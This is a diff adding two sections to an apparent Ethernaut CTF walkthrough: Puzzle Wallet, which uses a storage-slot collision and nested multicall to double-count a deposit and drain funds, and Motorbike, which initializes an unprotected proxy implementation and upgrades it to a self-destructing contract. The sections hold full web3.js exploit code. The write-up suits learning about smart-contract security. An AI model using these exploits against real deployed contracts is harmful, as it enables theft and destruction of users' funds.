@@ -515,3 +515,186 @@ await c.transfer(instance, 1);
 await contract.swap(c, a, 1);
 await contract.swap(c, b, 2);
 ```
+
+## 24. Puzzle Wallet
+If you understand delegatecall, you should be able to solve this. Essentially what is happening is that the storage variable `pendingAdmin` is sharing the same storage slot with `owner` and the storage variable `admin` is sharing the same storage slot with `maxBalance`.
+
+In order to change admin, we need to modify `maxBalance` (set it to the uint value of your address) but to modify `maxBalance`, we need to reduce the balance of the contract to 0. The `execute` function allows you to withdraw funds from the contract. What we need to figure out is how to call `deposit` and how can we get the contract to register more than what was deposited.
+
+`deposit` can only be called by a whitelisted address and to be whitelisted, you need to be an owner. By setting yourself as `pendingAdmin`, you will become the owner since the `pendingAdmin` and `owner` storage slot is shared. Once you become the owner, you can whitelist yourself and call the `deposit` function.
+
+In order to get the smart contract to register two deposits when only 1 was made, we need to take advantage of calling `multicall` within `multicall`. The reason why this works is because the `multicall` function checks for `deposit`'s function signature so by calling `deposit` within `multicall`, you are able to bypass the `require(!depositCalled, "Deposit can only be called once");` check.
+
+Not to worry if you don't fully understand, the code will explain everything
+
+```
+// Setting pending admin / owner
+pnaData = web3.eth.abi.encodeFunctionCall({
+    name: 'proposeNewAdmin',
+    type: 'function',
+    inputs: [{
+        type: 'address',
+        name: '_newAdmin'
+    }]
+}, [player]);
+
+await web3.eth.sendTransaction({
+    to: instance,
+    from: player,
+    data: pnaData
+})
+
+// check that you are now the owner
+// await contract.owner()
+
+// Whitelist yourself
+wlData = web3.eth.abi.encodeFunctionCall({
+    name: 'addToWhitelist',
+    type: 'function',
+    inputs: [{
+        type: 'address',
+        name: 'addr'
+    }]
+}, [player]);
+
+await web3.eth.sendTransaction({
+    to: instance,
+    from: player,
+    data: wlData
+})
+
+// setting up multicall within multicall
+depositData = web3.eth.abi.encodeFunctionCall({
+    name: 'deposit',
+    type: 'function',
+    inputs: []
+}, []);
+
+multicallData = web3.eth.abi.encodeFunctionCall({
+    name: 'multicall',
+    type: 'function',
+    inputs: [{
+        type: 'bytes[]',
+        name: 'data'
+    }]
+}, [[depositData]]);
+
+nestedMulticallData = web3.eth.abi.encodeFunctionCall({
+    name: 'multicall',
+    type: 'function',
+    inputs: [{
+        type: 'bytes[]',
+        name: 'data'
+    }]
+}, [[depositData, multicallData]]);
+
+// This is where you deposit 0.001 ETH but the smart contract records it as 2 deposits (0.002 ETH)!
+await web3.eth.sendTransaction({
+    to: instance,
+    from: player,
+    value: "1000000000000000",
+    data: nestedMulticallData
+})
+
+// Check that the smart contract recorded your deposit twice
+// (await contract.balances(player)).toString()
+
+// Withdraw all (should be 0.002) funds!
+executeData = web3.eth.abi.encodeFunctionCall({
+    name: 'execute',
+    type: 'function',
+    inputs: [{
+        type: 'address',
+        name: 'to'
+    }, {
+        type: 'uint256',
+        name: 'value'
+    }, {
+        type: 'bytes',
+        name: 'data'
+    }]
+}, [player, "2000000000000000", "0x"]);
+
+await web3.eth.sendTransaction({
+    to: instance,
+    from: player,
+    data: executeData
+})
+
+// Set yourself as new admin by calling set max balance
+smbData = web3.eth.abi.encodeFunctionCall({
+    name: 'setMaxBalance',
+    type: 'function',
+    inputs: [{
+        type: 'uint256',
+        name: '_maxBalance'
+    }]
+}, ["<insert the uint value of your address here>"]);
+
+await web3.eth.sendTransaction({
+    to: instance,
+    from: player,
+    data: smbData
+})
+```
+
+## 25. Motorbike
+
+Nowadays, using a proxy is quite a common pattern but if you don't understand what you are doing, it can lead to very disasterous consequences. This level is an example of what happened with [parity wallet](https://www.parity.io/blog/a-postmortem-on-the-parity-multi-sig-library-self-destruct/).
+
+We want to destroy the Motorbike but within the motorbike contract, there isn't any `selfdestruct` calls. Instead of attacking the Motorbike contract, why don't we attack the engine contract? Motorbike relies on the engine contract for its logic so if we can destroy the engine contract, the Motorbike is rendered useless.
+
+Let's interact directly with the engine contract and gain ownership of it. Once we're made the upgrader, we can easily upgrade the engine logic to a malicious contract and call `selfdestruct`.
+
+```
+// Get the engine contract address
+implAddr = await web3.eth.getStorageAt(instance, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
+
+implAddr = '0x' + implAddr.slice(26)
+
+// Call `initialize()` to become the upgrader
+data = web3.eth.abi.encodeFunctionSignature("initialize()")
+await web3.eth.sendTransaction({
+    from: player,
+    to: implAddr,
+    data: data
+})
+
+// Check that you are the upgrader
+// data = web3.eth.abi.encodeFunctionSignature("upgrader()")
+// await web3.eth.call({
+//     to: implAddr,
+//     data: data
+//     })
+
+// Create a bad contract and deploy it
+pragma solidity ^0.8.0;
+
+contract Kaboom {
+    function explode() public {
+        selfdestruct(payable(0));
+    }
+}
+
+badContractAddr = "<insert bad contract address here>"
+
+// create the payload to be called
+data = web3.eth.abi.encodeFunctionSignature("explode()")
+
+upgradeToAndCallData = web3.eth.abi.encodeFunctionCall({
+    name: 'upgradeToAndCall',
+    type: 'function',
+    inputs: [{
+        type: 'address',
+        name: 'newImplementation'
+    }, {
+        type: 'bytes',
+        name: 'data'
+    }
+]
+}, [badContractAddr, data])
+
+
+// Execute self destruct
+await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeToAndCallData})
+```
